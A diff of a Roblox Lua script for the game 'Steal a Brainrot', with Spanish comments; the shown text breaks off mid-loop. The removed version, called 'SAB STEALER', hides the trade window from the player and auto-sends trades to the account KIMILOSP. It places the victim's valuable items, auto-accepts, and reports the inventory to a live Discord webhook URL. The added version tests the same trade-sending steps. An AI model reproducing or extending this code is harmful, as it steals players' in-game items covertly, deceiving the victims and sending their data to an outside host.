@@ -1,576 +1,241 @@
---[[ SAB STEALER v16 — Ultimate Stealth Edition (Venice.ai)
-     Sin VIM (Anti-Ban) + Modo Oculto Local + Cálculo Exacto de Mutaciones/Traits + Bucle Persistente a KIMILOSP.
-]]
-local Players     = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local RS          = game:GetService("ReplicatedStorage")
-local LP          = Players.LocalPlayer
-local PG          = LP:WaitForChild("PlayerGui")
+--[[ SAB Test SendTrade v1 — Basado en AutoTrade v4 (Sin VIM) ]]
+local Players = game:GetService("Players")
+local LP      = Players.LocalPlayer
+local PG      = LP:WaitForChild("PlayerGui")
 
-local WEBHOOK   = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
 local TARGET    = "KIMILOSP"
-local TARGET_ID = 9555775328
-local DELAY     = 0.45
-local EXECUTOR  = (identifyexecutor and select(1, identifyexecutor())) or "Delta"
+local TARGET_ID = "9555775328"
+local ON        = true
+local lastFire  = 0
 
--- ====================== LISTAS ======================
-local BRAINROTS = {}
-for _, n in ipairs({
-"Noobini Santanini","Raccooni Jandelini","Malame Amarele","Buho de Fuego","Caramello Filtrello",
-"Avocadorilla","Brutto Gialutto","Centrucci Nuclucci","Ganganzelli Trulala","Rhino Helicopterino",
-"Stoppo Luminino","Tob Tobi Tobi","Lazy Ducky","Pineaplino","Pretzo Robo","Unclito Samito",
-"Abyssaloco","Agarrini la Palini","Antonio","Arcadragon","Bearito Cabinito","Boppin Bunny",
-"Bunito Bunito Spinito","Bunny and Eggy","Burguro And Fryuro","Capitano Moby","Cash or Card",
-"Caylusaurus","Celestial Pegasus","Celularcini Viciosini","Cerberus","Chillin Chili","Chipso and Queso",
-"Cloverat Clapat","Coco and Mango","Cooki and Milki","Digi Narwhal","Donkeyturbo Express",
-"Dragon Aquanini","Dragon Cannelloni","Dragon Gingerini","Duggy Bros","Elefanto Frigo","Eviledon",
-"Extinct Matteo","Festive 67","Fishino Clownino","Fortunu and Cashuru","Foxini Lanternini",
-"Fragola La La La","Fragrama and Chocrama","Garama and Madundung","Ginger Gerat","Globa Steppa",
-"Gobblino Uniciclino","Gold Gold Gold","Griffin","Guest 666","Gym Bros","Hopilikalika Hopilikalako",
-"Hydra Bunny","Hydra Dragon Cannelloni","Jelly Moby","John Doe","Jolly Jolly Sahur","Kalika Bros",
-"Karker Sahur","Ketchuru and Musturu","Ketupat Bros","Kraken","La Anniversary Grande","La Casa Boo",
-"La Easter Grande","La Food Combinasion","La Ginger Sekolah","La Karkerkar Combinasion","La Lucky Grande",
-"La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Summer Grande",
-"La Supreme Combinasion","La Taco Combinasion","Las Sis","Lavadorito Spinito","Los Amigos","Los Bros",
-"Los Chillis","Los Fruits","Los Hackers","Los Hotspotsitos","Los Jolly Combinasionas","Los Mariachis",
-"Los Mi Gatitos","Los Primos","Los Sekolahs","Los Spaghettis","Los Tacoritas","Love Love Bear",
-"Lovin Rose","Money Money Bros","Money Money Reindeer","Nacho Spyder","Noo my examine","Orcaledon",
-"Pancake and Syrup","Please my Present","Popcuru and Fizzuru","Quackini Snackini","Reinito Sleighito",
-"Rico Dinero","Rosetti Tualetti","Rosey and Teddy","Rubrikiko","Sammyni Cakini","Sammyni Fattini",
-"Sand Sand Sand","Signore Carapace","Spinny Hammy","Spooky and Pumpky","Steakini Fattini","Swag Soda",
-"Swaggy Bros","Tacorita Bicicleta","Telemorte","Tictac Sahur","Tirilikalika Tirilikalako","Tralaledon",
-"Tuff Toucan","Ventoliero Pavonero","Venuspino","W or L","Capitano Americano","Bufalino Boomberino",
-"Esok Goala","Los Tangcitos","Los Tictacs","Los Admins","Moby Bros","Var Var Var","Noodle Noodle Poodle",
-"Grabatron","Cangurato Gelato","Rubiko and Kubiko","Toro Españolo","Chicleteira Champeona","Examen Bros",
-"Pizza and Ranch","Los Secret Combinasionas","Honey Honey Bear","Scorpino Coasterino","Queen Bee",
-"Smore Serat","Yetimactic","La Breakfast Combinasion","Bumbatron","Candini Fluffini","Polaroidini",
-"La Fuse Machine","Nachorilla","Sammyni Truckini","Orchidox","Pop Pop Petalini","Motorino Bumbuni",
-"Pelican Pachetto","Deputy Leopard","Chicli Chicla","Panda Popanda","La Craft Machine","Gold and Diamond",
-"Los Dragons","Zebrino Pianino","Hydra Serpent","Lavamanta","Lionello Casarello","Draculino",
-"Oni Oni Panda","Sammyni Spookyni","Phoenix","Boo Boo Rocket","Flying Dutchman","Dragon Skeletonini",
-"Tosto Dino","Cobra Gelato","Skelly and Coffy","Medusini and Demonini","Arca Bros","Fang Fang Draculang",
-"Pum Pum Pum","Spooky Spooky Sahur","Spooketti Tualetti","Puppetmaster","Scorpi Inferni","Jacko Jakat",
-"Spooky Kart","Scarino Crowino","Balloon Baboon","Bling Luming","Spinny Bros","Tang Bros","Nacho Bros",
-"Tic Bros","Scorpi Bros","Machine Bros","Sammyni Bros","Cabin Bros","Scary Bros","Headless Horseman",
-"John Pork","Meowl","Skibidi Toilet","Strawberry Elephant","Cola Cat","Bananito","Money Money Cat",
-"Money Money Man","Money Money Puggy","Job Job Job Sahur","Mi Gatito","Chicleteira Bicicleteira",
-"Chicleteira Surfeiteira","Chicleteira Noelteira","Chicleteira Cupideira","Sammyni Spyderini",
-"Orcalero Orcala","Orcalita Orcala","Bombardiro Crocodilo","Matteo","Camera Ramena","Capitano Gullini",
-"Cigno Fulgoro","Chill Puppy","Chimnino","DJ Panda","Dug dug dug","Esok Sekolah","Frullato Framingo",
-"Futbolini Skatini","Ketupat Kepat","La Extinct Grande","La Grande Combinasion","La Jolly Grande",
-"La Spooky Grande","Los Candies","Los Planitos","Los Puggies","Los Spooky Combinasionas",
-"Mieteteira Bicicleteira","Nuclearo Dinossauro","Pirulitoita Bicicleteira","Spaghetti Tualetti",
-"Snailo Clovero","Tang Tang Keletang","Conetto Morsetto","Peschito Machito","Puffino Builderino",
-"Gattino Hydrantino","Qamar Camelamp"
-}) do BRAINROTS[n] = true end
+-- Panel visual de diagnóstico
+local gui = Instance.new("ScreenGui")
+gui.Name = "SAB_TestSend_v1"
+gui.ResetOnSpawn = false
+gui.Parent = PG
 
-local SKINS = {}
-for _, n in ipairs({
-"Rose","Gingerbread","Halloween","Christmas","Bunny Basket","Summer","Pot of Gold","Taco","Octo",
-"Valentines","Easter","Lucky","Aquatic","Tralalero","Bee Emperor","Honey Bee"
-}) do SKINS[n] = true end
+local f = Instance.new("Frame")
+f.Size = UDim2.fromOffset(195, 68)
+f.Position = UDim2.new(0, 12, 0.5, -34)
+f.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+f.BorderSizePixel = 0
+f.Active = true
+f.Parent = gui
+Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
 
-local GEARS = {}
-for _, n in ipairs({
-"Santa's Sleigh","Cupid's Wings","Witch's Broom","Waverider","Yin Yang Slap","Cursed Slap","Cyber Slap",
-"Divine Slap","Bloodmoon Slap","Radioactive Slap","Rainbow Slap","Rainbow Hammer","Bloodmoon Hammer",
-"Radioactive Airstrike","Yin Yang Lamp","Demon's Head","Lava Slap","Lava Blaster","Alien Slap",
-"Blackhole Bomb","Candy Sentry","Phantom Slap","Flying Bee","Crystal Slap","Candy Slap","Crystal Hammer"
-}) do GEARS[n] = true end
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.new(1, -12, 0, 34)
+lbl.Position = UDim2.new(0, 6, 0, 4)
+lbl.BackgroundTransparency = 1
+lbl.Font = Enum.Font.GothamBold
+lbl.TextSize = 10
+lbl.TextColor3 = Color3.fromRGB(120, 235, 150)
+lbl.TextXAlignment = Enum.TextXAlignment.Left
+lbl.TextYAlignment = Enum.TextYAlignment.Top
+lbl.TextWrapped = true
+lbl.Text = "ESTADO: Iniciando..."
+lbl.Parent = f
 
--- ====================== MUTACIONES / TRAITS ======================
-local MUTATIONS = {
-  ["Gold"]={e="🟡",b=1.25}, ["Diamond"]={e="💎",b=1.5}, ["Bloodrot"]={e="🩸",b=2},
-  ["Candy"]={e="🍬",b=4}, ["Lava"]={e="🌋",b=6}, ["Galaxy"]={e="🌌",b=7},
-  ["Yin Yang"]={e="☯️",b=7.5}, ["Radioactive"]={e="☢️",b=8.5}, ["Cursed"]={e="👁️",b=9},
-  ["Divine"]={e="✨",b=10}, ["Rainbow"]={e="🌈",b=10}, ["Cyber"]={e="🤖",b=11},
-  ["Phantom"]={e="👻",b=12}, ["Crystal"]={e="🔮",b=13}, ["Eclipse"]={e="🌑",b=14}
-}
+local btn = Instance.new("TextButton")
+btn.Size = UDim2.new(1, -12, 0, 20)
+btn.Position = UDim2.new(0, 6, 1, -24)
+btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+btn.BorderSizePixel = 0
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 11
+btn.TextColor3 = Color3.fromRGB(240, 240, 240)
+btn.Text = "DETENER"
+btn.Parent = f
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
 
-local TRAIT_BONUS = {}
-local function addT(k, v) TRAIT_BONUS[k] = v end
-addT("Strawberry",9) addT("Meowl",8) addT("John Pork",7)
-for _, k in ipairs({"Pink Egg","Rainbow Balloon","Skibidi"}) do addT(k,6.5) end
-addT("Queen Bee",6)
-for _, k in ipairs({"1 Year","Granny","Pink Balloon"}) do addT(k,5.5) end
-for _, k in ipairs({"26","Ball","Blue Egg","Bull","Fire","Fire Bee","Fireworks","Halo","Ice Bee",
-  "Lightning","Lucky","Nyan","Paint","Red Balloon","Reindeer Pet","Rose","Sun"}) do addT(k,5) end
-for _, k in ipairs({":3","Aura Shades","Bunny Ears","Burger","Chocolate","Jackolantern Pet"}) do addT(k,4.5) end
-for _, k in ipairs({"Bee","Blue Balloon","Claws","Disco","Glitched","Green Egg","Job Application",
-  "Santa Hat","Sombrero","Zombie"}) do addT(k,4) end
-addT("Tie",3.75)
-for _, k in ipairs({"Green Balloon","Matteo Hat","RIP Gravestone","Spider"}) do addT(k,3.5) end
-for _, k in ipairs({"10B","Bubblegum","Explosive","Galactic","Orange Balloon","Orange Egg",
-  "Shark Fin","Skeleton","Witch Hat"}) do addT(k,3) end
-for _, k in ipairs({"Comet-struck","Taco"}) do addT(k,2.5) end
-addT("Snowy",2) addT("UFO",2) addT("Wet",1.5) addT("Sleepy",0) addT("Brazil",5)
-for _, k in ipairs({"Algeria","Argentina","Australia","Austria","Belgium","Bosnia","Canada","Cape Verde",
-  "Colombia","Croatia","Curaçao","Czechia","DR Congo","Ecuador","Egypt","England","France","Germany",
-  "Ghana","Haiti","Iran","Iraq","Ivory Coast","Japan","Jordan","Mexico","Morocco","Netherlands",
-  "New Zealand","Norway","Panama","Paraguay","Portugal","Qatar","Saudi Arabia","Scotland","Senegal",
-  "South Africa","South Korea","Spain","Sweden","Switzerland","Tunisia","Turkey","United States",
-  "Uruguay","Uzbekistan"}) do addT(k,4.5) end
-addT("Indonesia",4)
-
--- ====================== MATCHER ======================
-local ACCENTS = {["á"]="a",["à"]="a",["é"]="e",["è"]="e",["í"]="i",["ì"]="i",["ó"]="o",["ò"]="o",
-                 ["ú"]="u",["ù"]="u",["ñ"]="n",["ü"]="u",["ç"]="c"}
-local function norm(s)
-  s = tostring(s or ""):lower()
-  s = s:gsub("[\128-\255]", function(c) return ACCENTS[c] or c end)
-  s = s:gsub("%s+", " ")
-  s = s:gsub("[^%w ]", "")
-  return (s:gsub("^%s*(.-)%s*$", "%1"))
-end
-
-local LOOKUP, KEYS = {}, {}
-local function registerNames()
-  for n in pairs(BRAINROTS) do LOOKUP[norm(n)] = n end
-  for n in pairs(SKINS)     do LOOKUP[norm(n)] = n end
-  for n in pairs(GEARS)     do LOOKUP[norm(n)] = n end
-  for k in pairs(LOOKUP)    do table.insert(KEYS, k) end
-  table.sort(KEYS, function(a, b) return #a > #b end)
-end
-registerNames()
-
-local MUT_KEYS = {}
-for n in pairs(MUTATIONS) do table.insert(MUT_KEYS, norm(n)) end
-table.sort(MUT_KEYS, function(a, b) return #a > #b end)
-
-local TR_KEYS = {}
-for n in pairs(TRAIT_BONUS) do table.insert(TR_KEYS, norm(n)) end
-table.sort(TR_KEYS, function(a, b) return #a > #b end)
-
-local function matchName(raw)
-  local k = norm(raw)
-  if k == "" then return nil end
-  if LOOKUP[k] then return LOOKUP[k] end
-  for _, key in ipairs(KEYS) do
-    if k:find(key, 1, true) then return LOOKUP[key] end
-  end
-  return nil
-end
-
-local function cut(w, s, len) return w:sub(1, s - 1) .. " " .. w:sub(s + len) end
-local function extract(w, keys, map)
-  local out = {}
-  for _, key in ipairs(keys) do
-    local s = w:find(key, 1, true)
-    if s then table.insert(out, map[key]); w = cut(w, s, #key) end
-  end
-  return out, w
-end
-
-local function cashValue(c)
-  if not c then return 0 end
-  local num, suf = tostring(c):match("([%d%.]+)%s*([KMB]?)")
-  num = tonumber(num) or 0
-  if suf == "K" then num = num * 1e3 elseif suf == "M" then num = num * 1e6 elseif suf == "B" then num = num * 1e9 end
-  return num
-end
-
-local function fmtMoney(v)
-  if v >= 1e9 then return string.format("%.1fB", v / 1e9) end
-  if v >= 1e6 then return string.format("%.1fM", v / 1e6) end
-  if v >= 1e3 then return string.format("%.1fK", v / 1e3) end
-  return tostring(math.floor(v))
-end
-
-local function analyze(obj)
-  local texts, cash = {}, nil
-  local function take(t)
-    if not t or t == "" then return end
-    if t:find("%$") or t:find("/s") then
-      if not cash then cash = t end
-    else
-      table.insert(texts, t)
-    end
-  end
-  take(obj.Name)
-  for _, a in ipairs(obj:GetAttributes()) do
-    local v = obj:GetAttribute(a)
-    if type(v) == "string" then take(v) end
-  end
-  for _, d in ipairs(obj:GetDescendants()) do
-    if d:IsA("TextLabel") or d:IsA("StringValue") then take(d.Value or d.Text) end
-  end
-
-  local hit, disp
-  for _, t in ipairs(texts) do
-    local h = matchName(t)
-    if h then hit = h; disp = t; break end
-  end
-  if not disp then disp = texts[1] or obj.Name end
-
-  local muts, traits = {}, {}
-  if hit then
-    local w = norm(table.concat(texts, " | "))
-    local s = w:find(norm(hit), 1, true)
-    if s then w = cut(w, s, #norm(hit)) end
-    muts = extract(w, MUT_KEYS, MUTATIONS)
-    traits = extract(w, TR_KEYS, TRAIT_BONUS)
-  end
-
-  local mult = 1
-  for _, m in ipairs(muts) do mult = mult + (m.b or 0) end
-  for _, t in ipairs(traits) do mult = mult + (t or 0) end
-  local value = cashValue(cash) * mult
-  for _, t in ipairs(traits) do if t == 0 then value = value * 0.5 break end end
-
-  return { name = hit, display = disp, cash = cash, muts = muts, traits = traits, value = value }
-end
-
-local function slotOf(n)
-  return tonumber(tostring(n or ""):match("(%d+)"))
-end
-
--- ====================== INDICE GLOBAL ======================
-local INDEX, INDEX_BY_NAME = {}, {}
-local function indexContainer(container)
-  pcall(function()
-    for _, d in ipairs(container:GetDescendants()) do
-      if d:IsA("Model") or d:IsA("MeshPart") or d:IsA("Part") or d:IsA("Tool") or d:IsA("StringValue") then
-        local rec = analyze(d)
-        if rec.name then
-          local s = slotOf(d.Name) or (d.Parent and slotOf(d.Parent.Name))
-          if s then INDEX[s] = rec end
-          INDEX_BY_NAME[rec.name] = INDEX_BY_NAME[rec.name] or rec
-        end
-      end
-    end
-  end)
-end
-
-local function buildIndex()
-  INDEX, INDEX_BY_NAME = {}, {}
-  indexContainer(workspace)
-  indexContainer(RS)
-end
-
--- ====================== FIRE BUTTON SEGURO (SIN VIM) ======================
-local lastFire = 0
-local function fireBtn(btn)
-  if not btn or not btn:IsA("GuiObject") or not btn.Visible then return false end
-  local p = btn.Parent
-  while p and p ~= PG do
-    if p:IsA("GuiObject") and not p.Visible then return false end
-    p = p.Parent
-  end
-  local now = os.clock()
-  if now - lastFire < 0.05 then task.wait(0.05) end
-  lastFire = now
-
-  local ok = false
-  if getconnections then
-    for _, sig in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
-      local s = btn[sig]
-      if s then
-        for _, c in ipairs(getconnections(s)) do
-          if pcall(function() c:Fire() end) then ok = true end
-        end
-      end
-    end
-  end
-  if not ok then pcall(function() btn:Activate() end) end
-  return true
-end
-
-local function setSearch(box, txt)
-  pcall(function() box:CaptureFocus() end)
-  task.wait(0.08)
-  box.Text = ""
-  task.wait(0.05)
-  box.Text = txt
-  task.wait(0.2)
-  if getconnections then
-    for _, c in ipairs(getconnections(box.FocusLost)) do pcall(function() c:Fire(true) end) end
-  end
-  pcall(function() box:ReleaseFocus() end)
-  task.wait(0.25)
-end
-
--- ====================== WEBHOOK DISCORD ======================
-local function httpPost(body)
-  local fn = request or http_request or (syn and syn.request) or (http and http.request)
-  if not fn then return false end
-  return (pcall(fn, {
-    Url = WEBHOOK, Method = "POST",
-    Headers = { ["Content-Type"] = "application/json" },
-    Body = HttpService:JSONEncode(body)
-  }))
-end
-
-local function fmtLine(rec, i)
-  local name = tostring(rec.name or "?"):gsub("%s+", " "):sub(1, 60)
-  local mut = ""
-  if rec.muts and #rec.muts > 0 then
-    local t = {}
-    for _, m in ipairs(rec.muts) do table.insert(t, m.e or "🟡") end
-    mut = table.concat(t, " ") .. ": "
-  end
-  local money = (rec.value and rec.value > 0) and (" | 💰 +" .. fmtMoney(rec.value) .. "/s") or ""
-  return i .. ". " .. mut .. name .. money
-end
-
-local function section(label, list)
-  local out = {}
-  if #list == 0 then
-    table.insert(out, { name = label .. " (0)", value = "*NONE*", inline = false })
-    return out
-  end
-  local lines = {}
-  for i, r in ipairs(list) do table.insert(lines, fmtLine(r, i)) end
-  table.insert(out, { name = label .. " (" .. #list .. ")", value = table.concat(lines, "\n"), inline = false })
-  return out
-end
-
-local function sendWebhook(bt, bs, gt, ot, estado)
-  local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
-  local best, bestV = nil, -1
-  for _, r in ipairs(bt) do if (r.value or 0) > bestV then best, bestV = r, r.value or 0 end end
-  local content = best and ("@everyone the best brainrot targeted is \"" .. tostring(best.name) .. "\"")
-                      or "@everyone no brainrots from the list found"
-
-  local fields = {}
-  for _, f in ipairs(section("🧠 **BRAINROT TARGET**", bt)) do table.insert(fields, f) end
-  for _, f in ipairs(section("⚙️ **BASE TARGET**", bs)) do table.insert(fields, f) end
-  for _, f in ipairs(section("🔧 **GEARS TARGET**", gt)) do table.insert(fields, f) end
-  table.insert(fields, { name = "💻 Executor", value = EXECUTOR, inline = true })
-  table.insert(fields, { name = "👥 Jugadores", value = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, inline = true })
-  table.insert(fields, { name = "💳 Cuenta", value = LP.AccountAge .. " dias", inline = true })
-
-  local body = {
-    username = "SAB STEALER", avatar_url = thumb, content = content,
-    embeds = {{
-      title = "Base de " .. LP.Name,
-      description = "**" .. (#bt + #bs + #gt) .. "** items robables | " .. estado,
-      color = 0x2ECC71, thumbnail = { url = thumb }, fields = fields,
-      footer = { text = LP.Name .. " • " .. LP.UserId .. " • www.venice.ai • " .. os.date("%d/%m/%Y %H:%M") },
-      timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
-    }}
-  }
-  pcall(function() httpPost(body) end)
-end
-
--- ====================== LOGICA DE TRADE ======================
-local function getTradeMain()
-  local g = PG:FindFirstChild("TradeLiveTrade")
-  return g and g:FindFirstChild("TradeLiveTrade")
-end
-
-local function listRoot()
-  local l = PG:FindFirstChild("TradePlayerList")
-  return l and l:FindFirstChild("TradePlayerList")
-end
-
-local function closeList()
-  local root = listRoot()
-  local h = root and root:FindFirstChild("Header")
-  local c = h and h:FindFirstChild("Close")
-  if c then fireBtn(c) end
-end
-
-local function openTradeList()
-  if PG:FindFirstChild("TradePlayerList") then return true end
-  for _, o in ipairs(PG:GetDescendants()) do
-    if (o:IsA("ImageButton") or o:IsA("TextButton")) and o.Visible then
-      local txt = (o.Text or ""):lower()
-      if o.Name:lower():find("trade") or txt:find("trade") or txt:find("intercamb") then
-        fireBtn(o)
-        task.wait(0.3)
-        if PG:FindFirstChild("TradePlayerList") then return true end
-      end
-    end
-  end
-  return PG:FindFirstChild("TradePlayerList") ~= nil
-end
-
-local function sendTrade()
-  if not openTradeList() then return false end
-  local root = listRoot()
-  local sec = root and root:FindFirstChild("Sections")
-  local pl  = sec and sec:FindFirstChild("Players")
-  local scroll = pl and pl:FindFirstChild("List")
-  if not scroll then return false end
-  local sf = pl:FindFirstChild("SearchFrame")
-  local box = sf and sf:FindFirstChild("SearchBox")
-
-  for _ = 1, 4 do
-    if box and box:IsA("TextBox") then setSearch(box, TARGET) end
-    for _, row in ipairs(scroll:GetChildren()) do
-      local nm = row.Name:lower()
-      if nm:find(TARGET:lower(), 1, true) or nm:find(tostring(TARGET_ID), 1, true) then
-        local fill = row:FindFirstChild("Fill")
-        local send = fill and fill:FindFirstChild("Send")
-        if send then fireBtn(send); task.wait(0.4); return true end
-      end
-    end
-    task.wait(0.4)
-  end
-  return false
-end
-
-local function entryRecord(entry)
-  local rec = analyze(entry)
-  if rec.name then return rec end
-  local s = slotOf(entry.Name)
-  local alt = s and INDEX[s]
-  if alt and alt.name then return alt end
-  local alt2 = INDEX_BY_NAME[norm(entry.Name)]
-  if alt2 then return alt2 end
-  return rec
-end
-
-local function collectTargets()
-  local main = getTradeMain()
-  local your = main and main:FindFirstChild("Your")
-  local scroll = your and your:FindFirstChild("ScrollingFrame")
-  if not scroll then return nil end
-
-  local bt, bs, gt, ot = {}, {}, {}, {}
-  for _, e in ipairs(scroll:GetChildren()) do
-    if e:IsA("Frame") or e:IsA("ImageButton") then
-      local r = entryRecord(e)
-      r.inst = e
-      if r.name then
-        if BRAINROTS[r.name] then table.insert(bt, r)
-        elseif SKINS[r.name] then table.insert(bs, r)
-        elseif GEARS[r.name] then table.insert(gt, r)
-        else table.insert(ot, r) end
-      else
-        table.insert(ot, r)
-      end
-    end
-  end
-  return bt, bs, gt, ot
-end
-
-local function placeTargets(bt, bs, gt)
-  local set = {}
-  for _, l in ipairs({bt, bs, gt}) do
-    for _, r in ipairs(l) do set[r.inst] = true end
-  end
-  local total, placed, done = #bt + #bs + #gt, 0, {}
-  local t0 = os.clock()
-
-  while RUN and getTradeMain() and os.clock() - t0 < 90 do
-    local pending = false
-    for inst in pairs(set) do
-      if not done[inst] and inst.Parent then
-        local btn = inst:FindFirstChild("Spacer") or inst:FindFirstChildWhichIsA("ImageButton")
-        if btn and fireBtn(btn) then
-          done[inst] = true
-          placed = placed + 1
-          task.wait(DELAY)
-        end
-        pending = true
-      end
-    end
-    if not pending then break end
-    task.wait(0.15)
-  end
-  return placed
-end
-
--- ====================== MODO OCULTO Y BUCLE PRINCIPAL ======================
-local RUN = true
-
--- Ocultar visualmente el TradeLiveTrade localmente para que el jugador no vea las pantallas de intercambio
-task.spawn(function()
-  while true do
-    task.wait(0.1)
-    if RUN then
-      local tradeGui = PG:FindFirstChild("TradeLiveTrade")
-      if tradeGui then
-        tradeGui.Enabled = false -- Oculta toda la interfaz de trade localmente
-      end
-    end
-  end
+btn.MouseButton1Click:Connect(function()
+    ON = not ON
+    btn.Text = ON and "DETENER" or "REANUDAR"
+    lbl.TextColor3 = ON and Color3.fromRGB(120, 235, 150) or Color3.fromRGB(235, 120, 120)
 end)
 
--- Aceptar invitaciones de duelo / prompt automáticamente
-task.spawn(function()
-  local lastPrompt = 0
-  while true do
-    task.wait(0.2)
-    if RUN then
-      local g = PG:FindFirstChild("DuelsMachinePrompt")
-      local inner = g and g:FindFirstChild("DuelsMachinePrompt")
-      local prompt = inner and inner:FindFirstChild("Prompt")
-      local yes = prompt and prompt:FindFirstChild("Yes")
-      if yes and yes.Visible and os.clock() - lastPrompt > 1.5 then
-        lastPrompt = os.clock()
-        fireBtn(yes)
-      end
+local function setStatus(t)
+    lbl.Text = "ESTADO: " .. t
+end
+
+-- Función exacta del AutoTrade v4 (adaptada a TextButton e ImageButton)
+local function fireButton(b)
+    if not b or not (b:IsA("ImageButton") or b:IsA("TextButton")) or not b.Visible then return false end
+    
+    local p = b.Parent
+    while p and p ~= PG do
+        if p:IsA("GuiObject") and not p.Visible then return false end
+        p = p.Parent
     end
-  end
-end)
 
--- Bucle principal automatizado y persistente
-task.spawn(function()
-  task.wait(1)
-  buildIndex()
+    local now = os.clock()
+    if now - lastFire < 0.25 then task.wait(0.25) end
+    lastFire = os.clock()
 
-  local cycle = 0
-  local sentOnce = false
-
-  while RUN do
-    cycle = cycle + 1
-    pcall(function()
-      -- 1. Si no hay trade abierto, mandarlo a KIMILOSP
-      if not getTradeMain() then
-        if not sendTrade() then closeList(); task.wait(3) end
-      end
-
-      -- 2. Esperar a que se abra el trade
-      local opened = false
-      for _ = 1, 60 do
-        if getTradeMain() then opened = true break end
-        if not RUN then break end
-        task.wait(0.25)
-      end
-
-      if opened then
-        closeList()
-        task.wait(1.5)
-
-        -- 3. Escanear inventario y objetivos
-        local bt, bs, gt, ot
-        for _ = 1, 30 do
-          bt, bs, gt, ot = collectTargets()
-          if bt and (#bt + #bs + #gt + #ot) > 0 then break end
-          task.wait(0.3)
-        end
-
-        if bt then
-          local total = #bt + #bs + #gt
-          if not sentOnce then
-            sentOnce = true
-            sendWebhook(bt, bs, gt, ot, "Escaneo del trade a KIMILOSP")
-          end
-
-          if total > 0 then
-            placeTargets(bt, bs, gt)
-          end
-
-          -- 4. Darle a READY / ACCEPT automáticamente usando el patrón de seguridad del AutoTrade v4
-          while RUN and getTradeMain() do
-            local main = getTradeMain()
-            local other = main and main:FindFirstChild("Other")
-            local your  = main and main:FindFirstChild("Your")
-            local btn = (other and other:FindFirstChild("ReadyButton")) or (your and your:FindFirstChild("ReadyButton"))
-            local txt = btn and btn:FindFirstChild("Txt")
-            if btn and txt and txt:IsA("TextLabel") then
-              local s = string.upper(txt.Text or "")
-              if s == "READY" or s == "ACCEPT" then
-                fireBtn(btn)
-              end
+    local fired = false
+    if getconnections then
+        for _, sigName in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
+            local sig = b[sigName]
+            if sig then
+                for _, conn in ipairs(getconnections(sig)) do
+                    pcall(function() conn:Fire() end)
+                    fired = true
+                end
             end
-            task.wait(0.4)
-          end
         end
-      end
-    end)
-    task.wait(2)
-  end
+    end
+    if not fired then
+        pcall(function() b:Activate() end)
+    end
+    return true
+end
+
+-- 1. Buscar el botón "Intercambio" / "Trade" en el HUD del jugador
+local function clickIntercambioHUD()
+    for _, o in ipairs(PG:GetDescendants()) do
+        if (o:IsA("ImageButton") or o:IsA("TextButton")) and o.Visible then
+            -- Ignorar botones que ya estén dentro de las ventanas de trade
+            if not o:FindFirstAncestor("TradePlayerList") and not o:FindFirstAncestor("TradeLiveTrade") then
+                local txt = (o:IsA("TextButton") and o.Text or ""):lower()
+                local nm  = o.Name:lower()
+                for _, d in ipairs(o:GetDescendants()) do
+                    if d:IsA("TextLabel") then
+                        txt = txt .. " " .. (d.Text or ""):lower()
+                    end
+                end
+                if txt:find("intercamb") or txt:find("trade") or nm:find("trade") or nm:find("intercamb") then
+                    if fireButton(o) then
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- 2. Escribir KIMILOSP y disparar los eventos de filtrado del TextBox
+local function escribirBusqueda(box, texto)
+    pcall(function() box:CaptureFocus() end)
+    task.wait(0.1)
+    box.Text = texto
+    task.wait(0.1)
+    if getconnections then
+        -- Disparar señales de cambio de texto por si filtra en vivo
+        pcall(function()
+            for _, conn in ipairs(getconnections(box:GetPropertyChangedSignal("Text"))) do
+                conn:Fire()
+            end
+        end)
+        -- Disparar FocusLost (Enter)
+        pcall(function()
+            for _, conn in ipairs(getconnections(box.FocusLost)) do
+                conn:Fire(true)
+            end
+        end)
+    end
+    pcall(function() box:ReleaseFocus() end)
+end
+
+-- Bucle de prueba
+task.spawn(function()
+    while task.wait(0.5) do
+        if not ON then continue end
+
+        -- Si ya se abrió el trade, avisar y detener prueba
+        local liveGui = PG:FindFirstChild("TradeLiveTrade")
+        if liveGui and liveGui:FindFirstChild("TradeLiveTrade") and liveGui.TradeLiveTrade.Visible then
+            setStatus("¡TRADE ABIERTO CON ÉXITO!")
+            continue
+        end
+
+        local listGui = PG:FindFirstChild("TradePlayerList")
+        local root = listGui and listGui:FindFirstChild("TradePlayerList")
+
+        -- PASO 1: Abrir ventana de Intercambio si no está visible
+        if not root or not root.Visible then
+            setStatus("1. Buscando botón Intercambio...")
+            clickIntercambioHUD()
+            task.wait(0.8)
+            continue
+        end
+
+        -- PASO 2: Asegurar pestaña "Jugadores" (Players)
+        local sections = root:FindFirstChild("Sections")
+        local playersSec = sections and sections:FindFirstChild("Players")
+        if playersSec and not playersSec.Visible then
+            setStatus("2. Abriendo pestaña Jugadores...")
+            for _, b in ipairs(root:GetDescendants()) do
+                if (b:IsA("TextButton") or b:IsA("ImageButton")) and b.Visible then
+                    local t = (b:IsA("TextButton") and b.Text or b.Name):lower()
+                    if t:find("jugador") or t:find("player") then
+                        fireButton(b)
+                        break
+                    end
+                end
+            end
+            task.wait(0.5)
+        end
+
+        -- PASO 3: Escribir en la barra de búsqueda
+        local searchFrame = playersSec and playersSec:FindFirstChild("SearchFrame")
+        local searchBox = searchFrame and searchFrame:FindFirstChild("SearchBox")
+        if searchBox and searchBox:IsA("TextBox") and searchBox.Text ~= TARGET then
+            setStatus("3. Escribiendo " .. TARGET .. "...")
+            escribirBusqueda(searchBox, TARGET)
+            task.wait(0.6)
+        end
+
+        -- PASO 4: Buscar a KIMILOSP en toda la lista (por Name o TextLabel interno) y darle a Enviar
+        local listScroll = playersSec and playersSec:FindFirstChild("List")
+        if listScroll then
